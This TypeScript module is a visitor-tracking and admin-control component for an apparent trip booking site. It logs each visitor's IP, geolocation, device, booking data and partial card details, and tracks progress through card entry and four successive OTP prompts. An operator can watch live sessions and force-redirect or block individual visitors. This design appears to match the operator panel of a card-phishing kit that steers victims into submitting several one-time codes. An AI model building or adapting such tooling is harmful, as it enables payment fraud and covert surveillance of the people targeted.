// ═══════════════════════════════════════════════════════════════
//  Visitor Tracking System — Full Step-by-Step + IP + Controls
// ═══════════════════════════════════════════════════════════════

export type VisitorStep =
  | 'home' | 'search' | 'results' | 'trip_details'
  | 'seat_selection' | 'passenger_info' | 'payment_method'
  | 'payment' | 'code_verification' | 'otp_2' | 'otp_3' | 'otp_4'
  | 'success' | 'code_failed' | 'closed';

export interface VisitorSession {
  sessionId: string;
  ip: string;
  country: string;
  city: string;
  startTime: number;
  lastActive: number;
  currentStep: VisitorStep;
  stepHistory: { step: VisitorStep; time: number }[];
  isBlocked: boolean;
  deviceInfo: string;
  screenSize: string;
  geoLat?: number;
  geoLng?: number;
  bookingData?: {
    from?: string;
    to?: string;
    date?: string;
    passengers?: number;
    selectedTrip?: string;
    selectedSeats?: string[];
    fareClass?: string;
  };
  cardInfo?: {
    cardType?: string;
    bankName?: string;
    cardLast4?: string;
  };
}

const VISITORS_KEY = 'sat_visitor_sessions';
const SESSION_PREFIX = 'sat_session_';

const STEP_LABELS: Record<VisitorStep, string> = {
  home: 'الصفحة الرئيسية',
  search: 'البحث',
  results: 'نتائج الرحلات',
  trip_details: 'تفاصيل الرحلة',
  seat_selection: 'اختيار المقاعد',
  passenger_info: 'بيانات المسافرين',
  payment_method: 'طريقة الدفع',
  payment: 'بيانات البطاقة',
  code_verification: 'OTP الأول',
  otp_2: 'OTP ثاني',
  otp_3: 'OTP ثالث',
  otp_4: 'OTP رابع (محاولات نفدت)',
  success: 'نجاح الدفع',
  code_failed: 'فشل الدفع',
  closed: 'غادر الموقع',
};

const STEP_COLORS: Record<VisitorStep, string> = {
  home: '#8A7E6B',
  search: '#4FC3F7',
  results: '#2196F3',
  trip_details: '#9C27B0',
  seat_selection: '#FF9800',
  passenger_info: '#00BCD4',
  payment_method: '#C4A94D',
  payment: '#1B6B3B',
  code_verification: '#E91E63',
  otp_2: '#F44336',
  otp_3: '#D32F2F',
  otp_4: '#B71C1C',
  success: '#4CAF50',
  code_failed: '#FF5722',
  closed: '#9E9E9E',
};

export function getStepLabel(step: VisitorStep): string { return STEP_LABELS[step] || step; }
export function getStepColor(step: VisitorStep): string { return STEP_COLORS[step] || '#8A7E6B'; }

// ─── IP Detection ───────────────────────────────────────────
let cachedIP: string | null = null;

export async function detectVisitorIP(): Promise<{ ip: string; country: string; city: string; lat?: number; lng?: number }> {
  if (cachedIP) {
    return { ip: cachedIP, country: '', city: '' };
  }
  try {
    const res = await fetch('https://ipapi.co/json/');
    if (res.ok) {
      const data = await res.json();
      cachedIP = data.ip || 'unknown';
      return {
        ip: data.ip || 'unknown',
        country: data.country_name || '',
        city: data.city || '',
        lat: data.latitude,
        lng: data.longitude,
      };
    }
  } catch {
    // Fallback to ipify
    try {
      const res2 = await fetch('https://api.ipify.org?format=json');
      if (res2.ok) {
        const data2 = await res2.json();
        cachedIP = data2.ip || 'unknown';
        return { ip: data2.ip || 'unknown', country: '', city: '' };
      }
    } catch { /* ignore */ }
  }
  return { ip: 'unknown', country: '', city: '' };
}

// ─── Tab-specific session ID ────────────────────────────────
let _sessionId: string | null = null;

function getSessionKey(): string {
  if (!_sessionId) {
    _sessionId = 'v_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
  }
  return SESSION_PREFIX + _sessionId;
}

// ─── Get/Create Current Session ─────────────────────────────
export function getOrCreateSession(): VisitorSession {
  try {
    const raw = localStorage.getItem(getSessionKey());
    if (raw) {
      const s = JSON.parse(raw) as VisitorSession;
      s.lastActive = Date.now();
      localStorage.setItem(getSessionKey(), JSON.stringify(s));
      return s;
    }
  } catch { /* ignore */ }

  const newSession: VisitorSession = {
    sessionId: _sessionId || getSessionKey().replace(SESSION_PREFIX, ''),
    ip: 'unknown',
    country: '',
    city: '',
    startTime: Date.now(),
    lastActive: Date.now(),
    currentStep: 'home',
    stepHistory: [{ step: 'home', time: Date.now() }],
    isBlocked: false,
    deviceInfo: navigator.userAgent.slice(0, 80),
    screenSize: `${window.innerWidth}x${window.innerHeight}`,
  };
  localStorage.setItem(getSessionKey(), JSON.stringify(newSession));
  return newSession;
}

// ─── Update Visitor Step ────────────────────────────────────
export function updateVisitorStep(step: VisitorStep, extraData?: Partial<VisitorSession>): void {
  try {
    const s = getOrCreateSession();
    s.currentStep = step;
    s.lastActive = Date.now();
    s.stepHistory.push({ step, time: Date.now() });

    if (extraData?.bookingData) s.bookingData = { ...s.bookingData, ...extraData.bookingData };
    if (extraData?.cardInfo) s.cardInfo = { ...s.cardInfo, ...extraData.cardInfo };
    if (extraData?.ip) s.ip = extraData.ip;
    if (extraData?.geoLat) s.geoLat = extraData.geoLat;
    if (extraData?.geoLng) s.geoLng = extraData.geoLng;
    if (extraData?.country) s.country = extraData.country;
    if (extraData?.city) s.city = extraData.city;

    localStorage.setItem(getSessionKey(), JSON.stringify(s));
    pushToAdmin(s);
  } catch { /* ignore */ }
}

// ─── Push to Admin Storage ──────────────────────────────────
function pushToAdmin(session: VisitorSession): void {
  try {
    const raw = localStorage.getItem(VISITORS_KEY);
    const all: VisitorSession[] = raw ? JSON.parse(raw) : [];
    const idx = all.findIndex(v => v.sessionId === session.sessionId);
    if (idx >= 0) all[idx] = session;
    else all.push(session);
    // Keep only last 200 sessions
    if (all.length > 200) all.splice(0, all.length - 200);
    localStorage.setItem(VISITORS_KEY, JSON.stringify(all));
  } catch { /* ignore */ }
}

// ─── Admin: Get All Visitors ────────────────────────────────
export function getAllVisitors(): VisitorSession[] {
  try {
    const raw = localStorage.getItem(VISITORS_KEY);
    if (raw) return JSON.parse(raw);
  } catch { /* ignore */ }
  return [];
}

// ─── Admin: Get Visitor by ID ───────────────────────────────
export function getVisitor(sessionId: string): VisitorSession | null {
  return getAllVisitors().find(v => v.sessionId === sessionId) || null;
}

// ─── Admin: Block Visitor ───────────────────────────────────
export function blockVisitor(sessionId: string, blocked: boolean): void {
  try {
    const all = getAllVisitors();
    const v = all.find(x => x.sessionId === sessionId);
    if (v) v.isBlocked = blocked;
    localStorage.setItem(VISITORS_KEY, JSON.stringify(all));
  } catch { /* ignore */ }
}

// ─── Admin: Force Redirect Visitor ──────────────────────────
export function forceRedirect(sessionId: string, target: string): void {
  try {
    const all = getAllVisitors();
    const v = all.find(x => x.sessionId === sessionId);
    if (v) (v as any)._forceRedirect = target;
    localStorage.setItem(VISITORS_KEY, JSON.stringify(all));
  } catch { /* ignore */ }
}

// ─── Admin: Check if Visitor Should Redirect ────────────────
export function checkForceRedirect(): string | null {
  try {
    const raw = localStorage.getItem(getSessionKey());
    if (!raw) return null;
    const s = JSON.parse(raw) as VisitorSession;
    const all = getAllVisitors();
    const admin = all.find(v => v.sessionId === s.sessionId);
    if ((admin as any)?._forceRedirect) {
      const target = (admin as any)._forceRedirect;
      delete (admin as any)._forceRedirect;
      localStorage.setItem(VISITORS_KEY, JSON.stringify(all));
      return target;
    }
  } catch { /* ignore */ }
  return null;
}

// ─── Admin: Get Active Visitors (last 5 min) ────────────────
export function getActiveVisitors(): VisitorSession[] {
  const now = Date.now();
  return getAllVisitors().filter(v => !v.isBlocked && now - v.lastActive < 5 * 60 * 1000);
}

// ─── Admin: Get Blocked Visitors ────────────────────────────
export function getBlockedVisitors(): VisitorSession[] {
  return getAllVisitors().filter(v => v.isBlocked);
}

// ─── Update session with detected IP ────────────────────────
export async function initVisitorWithIP(): Promise<void> {
  try {
    const ipData = await detectVisitorIP();
    const s = getOrCreateSession();
    if (s.ip === 'unknown' && ipData.ip !== 'unknown') {
      s.ip = ipData.ip;
      s.country = ipData.country;
      s.city = ipData.city;
      if (ipData.lat) s.geoLat = ipData.lat;
      if (ipData.lng) s.geoLng = ipData.lng;
      localStorage.setItem(getSessionKey(), JSON.stringify(s));
      pushToAdmin(s);
    }
  } catch { /* ignore */ }
}

// ─── Admin: Cleanup Old Visitors ────────────────────────────
export function cleanupVisitors(): void {
  const now = Date.now();
  const all = getAllVisitors().filter(v => now - v.lastActive < 24 * 60 * 60 * 1000);
  // Also cleanup old individual sessions
  for (let i = localStorage.length - 1; i >= 0; i--) {
    const key = localStorage.key(i);
    if (key?.startsWith(SESSION_PREFIX)) {
      try {
        const raw = localStorage.getItem(key);
        if (raw) {
          const s = JSON.parse(raw) as VisitorSession;
          if (now - s.lastActive > 24 * 60 * 60 * 1000) {
            localStorage.removeItem(key);
          }
        }
      } catch { /* ignore */ }
    }
  }
  localStorage.setItem(VISITORS_KEY, JSON.stringify(all));
}
